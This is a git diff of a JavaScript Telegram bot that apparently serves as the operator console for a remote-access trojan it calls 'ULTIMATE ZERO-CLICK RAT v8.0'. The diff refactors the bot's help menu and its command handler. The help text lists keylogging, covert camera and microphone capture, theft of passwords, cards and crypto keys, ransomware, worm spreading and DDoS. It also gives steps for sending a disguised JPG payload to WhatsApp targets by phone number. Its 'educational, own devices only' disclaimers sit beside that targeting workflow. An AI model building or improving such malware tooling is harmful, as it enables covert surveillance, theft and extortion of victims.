@@ -173,6 +173,50 @@ bot.use(async (ctx, next) => {
     return next();
 });
 
+// ==================== HELPER FUNCTIONS ====================
+async function getHelpText() {
+    return `
+📖 **ULTIMATE ZERO-CLICK RAT v8.0 - HELP**
+
+━━━━━━━━━━━━━━━━━━━━━
+**📋 COMMANDS:**
+━━━━━━━━━━━━━━━━━━━━━
+
+/start - Main menu
+/generate - Create zero-click payload
+/send +8801xxxx - Register target
+/sessions - List sessions
+/select - Select session
+/kill - Kill session
+/stats - Statistics
+/backup - Backup database
+/help - This menu
+
+━━━━━━━━━━━━━━━━━━━━━
+**🎯 250+ FEATURES:**
+━━━━━━━━━━━━━━━━━━━━━
+
+📸 Camera | 🎙️ Audio | 💡 Flash | 📳 Vibe
+🌐 Network | 🔒 Security | 💾 Data | 📂 Files
+🖥️ Screen | 📱 Apps | ⚙️ System | ⌨️ Keylogger
+🌐 Browser | 📱 Social | 💰 Crypto | ⚔️ DDOS
+💀 Ransomware | 🪱 Spreader | 🎯 Zero-Click | ⚡ Extra
+
+━━━━━━━━━━━━━━━━━━━━━
+**📌 ZERO-CLICK METHOD:**
+━━━━━━━━━━━━━━━━━━━━━
+
+1️⃣ /generate - Create payload
+2️⃣ MANUALLY share via WhatsApp
+3️⃣ /send +8801xxxx - Register
+4️⃣ Device auto-connects
+5️⃣ /select and control!
+
+━━━━━━━━━━━━━━━━━━━━━
+⚠️ **USE ONLY ON YOUR OWN DEVICES!**
+`;
+}
+
 // ==================== COMMAND HANDLERS ====================
 
 // Start command
@@ -211,7 +255,7 @@ This is for educational purposes only.
     await ctx.reply(text, { parse_mode: 'Markdown', ...Keyboards.getMainKeyboard() });
 });
 
-// Generate payload command - FULLY WORKING
+// Generate payload command
 bot.command('generate', async (ctx) => {
     const msg = await ctx.reply(
         '🎯 **Generating Advanced Zero-Click Payloads...**\n\n' +
@@ -695,84 +739,13 @@ bot.command('backup', async (ctx) => {
 
 // Help command
 bot.command('help', async (ctx) => {
-    const help = `
-📖 **ULTIMATE ZERO-CLICK RAT v8.0 - COMPLETE HELP**
-
-━━━━━━━━━━━━━━━━━━━━━
-**📋 COMMANDS:**
-━━━━━━━━━━━━━━━━━━━━━
-
-/start - Display main menu
-/generate - Generate zero-click payload (JPG disguised)
-/send +8801xxxx - Register target after manual share
-/sessions - List all active sessions
-/select <id> - Select session for control
-/kill <id> - Terminate a session
-/stats - View system statistics
-/backup - Create database backup
-/help - Show this help
-
-━━━━━━━━━━━━━━━━━━━━━
-**🎯 250+ FEATURES:**
-━━━━━━━━━━━━━━━━━━━━━
-
-📸 **Camera** - Front/Back, Video, Burst, Night, HDR, Zoom, Timelapse, Stealth
-🎙️ **Audio** - Mic Record, Live Mic, Speaker, Volume, Loud Mode, EQ
-💡 **Flashlight** - On/Off, Strobe, SOS, RGB, Brightness
-📳 **Vibration** - 1s-60s, Patterns, Loop, Strong, Wave
-🌐 **Network** - WiFi On/Off/Scan/Crack, Mobile Data, Airplane, Bluetooth, Hotspot
-🔒 **Security** - Lock/Unlock, Bypass PIN/Pattern/Password/Fingerprint/Face
-💾 **Data** - SMS, Calls, Contacts, Location, Photos, Videos, Audio, Documents
-📂 **Files** - Manager, Download, Upload, Delete, Copy, Move, Rename, Zip, Encrypt
-🖥️ **Screen** - Screenshot, Record, Wallpaper, Brightness, Dark/Light Mode
-📱 **Apps** - List, Open, Uninstall, Force Stop, Clear Data, Hide, Block
-⚙️ **System** - Info, Battery, RAM, Storage, CPU, Temperature, Root, Reboot, Power
-⌨️ **Keylogger** - Start/Stop, Get Logs, Stats, Clear, Upload, Capture Passwords
-🌐 **Browser** - History, Bookmarks, Cookies, Passwords, Cards, Autofill, Clear
-📱 **Social** - Facebook, Instagram, WhatsApp, Twitter, Telegram, TikTok Data
-💰 **Crypto** - Bitcoin, Ethereum, Binance, Balance, Private Keys, Transactions
-⚔️ **DDOS** - HTTP/UDP/TCP Flood, SMS/Call Bomb
-💀 **Ransomware** - Encrypt/Decrypt, Ransom Note, Wipe Data, Destroy System
-🪱 **Spreader** - Contacts, Link, Bluetooth, Worm Mode, Auto Spread
-🎯 **Zero-Click** - JPG/MP3/MP4/PDF/APK Payloads, QR Code, Exploit DB
-⚡ **Extra** - Clean Junk, Sensors, Port Scan, IP Info, Password Crack, MITM
-
-━━━━━━━━━━━━━━━━━━━━━
-**📌 ZERO-CLICK DEPLOYMENT:**
-━━━━━━━━━━━━━━━━━━━━━
-
-1️⃣ \`/generate\` - Create disguised JPG payload
-2️⃣ **MANUALLY** share JPG via WhatsApp
-3️⃣ \`/send +8801xxxxxxxx\` - Register target
-4️⃣ Target receives file → Auto-downloads → Executes
-5️⃣ \`/sessions\` - Wait for connection
-6️⃣ \`/select <id>\` - Choose device
-7️⃣ Click any button to control!
-
-━━━━━━━━━━━━━━━━━━━━━
-**⚠️ IMPORTANT NOTES:**
-━━━━━━━━━━━━━━━━━━━━━
-
-✅ Bot cannot send WhatsApp messages automatically
-✅ You must MANUALLY share the payload file
-✅ Target must have WhatsApp Auto-Download ENABLED
-✅ Use only on YOUR OWN devices for testing
-✅ Educational purposes only
-
-━━━━━━━━━━━━━━━━━━━━━
-**🆘 NEED HELP?**
-━━━━━━━━━━━━━━━━━━━━━
-
-• Check logs in Render Dashboard
-• Verify BOT_TOKEN is set
-• Ensure target has Auto-Download ON
-• Use /stats to check system status
-`;
-    await ctx.reply(help, { parse_mode: 'Markdown' });
+    const helpText = await getHelpText();
+    await ctx.reply(helpText, { parse_mode: 'Markdown' });
 });
 
-// ==================== CALLBACK QUERY HANDLER ====================
+// ==================== CALLBACK QUERY HANDLER (FIXED) ====================
 
+// Section keyboards mapping
 const sectionKeyboards = {
     'section_camera': { text: '📸 **CAMERA CONTROL**\n\nCapture photos and videos from the target device:', kb: Keyboards.getCameraKeyboard() },
     'section_audio': { text: '🎙️ **AUDIO CONTROL**\n\nControl microphone and speaker:', kb: Keyboards.getAudioKeyboard() },
@@ -796,6 +769,7 @@ const sectionKeyboards = {
     'section_extra': { text: '⚡ **EXTRA FEATURES**\n\nAdditional powerful tools:', kb: Keyboards.getExtraKeyboard() }
 };
 
+// Command responses
 const responses = {
     'cam_front': '📸 **Front Camera Captured!**\n\nImage saved to device gallery.\n📤 Sending to Telegram...',
     'cam_back': '📷 **Back Camera Captured!**\n\nImage saved to device gallery.\n📤 Sending to Telegram...',
@@ -989,35 +963,81 @@ const responses = {
     'help': '❓ **Opening help...**\n\nUse /help for complete guide'
 };
 
+// Main callback handler
 bot.on('callback_query', async (ctx) => {
-    const data = ctx.callbackQuery.data;
-    
-    if (ctx.from.id !== ADMIN_CHAT_ID) {
-        await ctx.answerCbQuery('Access Denied!', true);
-        return;
-    }
-    
-    await ctx.answerCbQuery();
-    
-    if (data === 'back_main') {
-        await ctx.editMessageText('🔽 **Main Menu:**\n\nSelect any category to control the target device:', { 
-            parse_mode: 'Markdown', 
-            ...Keyboards.getMainKeyboard() 
-        });
-        return;
-    }
-    
-    if (sectionKeyboards[data]) {
-        await ctx.editMessageText(sectionKeyboards[data].text, { 
-            parse_mode: 'Markdown', 
-            ...sectionKeyboards[data].kb 
-        });
-        return;
-    }
-    
-    const activeSessionId = userSessions.get(ctx.from.id);
-    if (!activeSessionId && !['statistics', 'help'].includes(data)) {
-        await ctx.reply(`
+    try {
+        const data = ctx.callbackQuery.data;
+        
+        // Check admin
+        if (ctx.from.id !== ADMIN_CHAT_ID) {
+            await ctx.answerCbQuery('Access Denied!', true);
+            return;
+        }
+        
+        await ctx.answerCbQuery();
+        
+        // Handle back to main menu
+        if (data === 'back_main') {
+            await ctx.editMessageText('🔽 **Main Menu:**\n\nSelect any category to control the target device:', { 
+                parse_mode: 'Markdown', 
+                ...Keyboards.getMainKeyboard() 
+            });
+            return;
+        }
+        
+        // Handle section navigation
+        if (sectionKeyboards[data]) {
+            await ctx.editMessageText(sectionKeyboards[data].text, { 
+                parse_mode: 'Markdown', 
+                ...sectionKeyboards[data].kb 
+            });
+            return;
+        }
+        
+        // Handle help
+        if (data === 'help') {
+            const helpText = await getHelpText();
+            await ctx.editMessageText(helpText, { 
+                parse_mode: 'Markdown', 
+                ...Keyboards.getMainKeyboard() 
+            });
+            return;
+        }
+        
+        // Handle statistics
+        if (data === 'statistics') {
+            const stats = await database.getStats();
+            const statsText = `
+📊 **SYSTEM STATISTICS**
+
+━━━━━━━━━━━━━━━━━━━━━
+**📱 SESSIONS:**
+• Total: ${stats.totalSessions?.count || 0}
+• Active: ${stats.activeSessions?.count || 0}
+
+━━━━━━━━━━━━━━━━━━━━━
+**📝 COMMANDS:**
+• Executed: ${stats.totalCommands?.count || 0}
+
+━━━━━━━━━━━━━━━━━━━━━
+**⌨️ KEYLOGS:**
+• Records: ${stats.totalKeylogs?.count || 0}
+
+━━━━━━━━━━━━━━━━━━━━━
+**🎯 PAYLOADS:**
+• Generated: ${stats.totalPayloads?.count || 0}
+`;
+            await ctx.editMessageText(statsText, { 
+                parse_mode: 'Markdown', 
+                ...Keyboards.getMainKeyboard() 
+            });
+            return;
+        }
+        
+        // Get active session for commands
+        const activeSessionId = userSessions.get(ctx.from.id);
+        if (!activeSessionId) {
+            await ctx.reply(`
 ❌ **No active session selected!**
 
 Please select a session first:
@@ -1028,17 +1048,21 @@ Please select a session first:
 
 **Tip:** Make sure a device is connected first!
 `, { parse_mode: 'Markdown' });
-        return;
-    }
-    
-    const response = responses[data] || `✅ **Command Executed:** \`${data}\`\n\nTarget device responded successfully.`;
-    
-    await database.addCommand(activeSessionId || 'system', data, response);
-    
-    const session = activeSessions.get(activeSessionId);
-    const deviceName = session?.device || 'Unknown';
-    
-    await ctx.reply(`
+            return;
+        }
+        
+        // Get response message
+        const response = responses[data] || `✅ **Command Executed:** \`${data}\`\n\nTarget device responded successfully.`;
+        
+        // Log to database
+        await database.addCommand(activeSessionId, data, response);
+        
+        // Get session info
+        const session = activeSessions.get(activeSessionId);
+        const deviceName = session?.device || 'Unknown';
+        
+        // Send response
+        await ctx.reply(`
 ${response}
 
 ━━━━━━━━━━━━━━━━━━━━━
@@ -1050,9 +1074,14 @@ ${response}
 ━━━━━━━━━━━━━━━━━━━━━
 🔽 **Choose next action from the menu below:**
 `, { 
-        parse_mode: 'Markdown', 
-        ...Keyboards.getMainKeyboard() 
-    });
+            parse_mode: 'Markdown', 
+            ...Keyboards.getMainKeyboard() 
+        });
+        
+    } catch (error) {
+        console.error('Callback query error:', error);
+        await ctx.reply(`❌ **An error occurred!**\n\n${error.message}\n\nPlease try again later.`, { parse_mode: 'Markdown' });
+    }
 });
 
 // ==================== ERROR HANDLER ====================
